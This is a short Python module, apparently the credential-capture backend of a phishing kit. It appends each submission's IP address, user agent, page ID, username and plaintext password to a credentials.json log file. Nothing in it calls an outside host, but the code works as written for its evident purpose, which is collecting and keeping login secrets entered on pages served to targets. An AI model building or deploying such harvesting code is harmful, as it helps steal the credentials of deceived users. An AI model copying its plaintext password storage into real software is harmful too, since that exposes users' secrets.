import json
import os
from datetime import datetime, timezone

LOG_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "logs", "credentials.json")


def log_submission(ip: str, user_agent: str, page_id: str, username: str, password: str) -> None:
    log_file = os.path.normpath(LOG_PATH)
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": ip,
        "user_agent": user_agent,
        "page_id": page_id,
        "username": username,
        "password": password,
    }

    records: list = []
    if os.path.isfile(log_file):
        with open(log_file, "r", encoding="utf-8") as fh:
            try:
                records = json.load(fh)
            except (json.JSONDecodeError, ValueError):
                records = []

    records.append(entry)

    with open(log_file, "w", encoding="utf-8") as fh:
        json.dump(records, fh, indent=2, ensure_ascii=False)
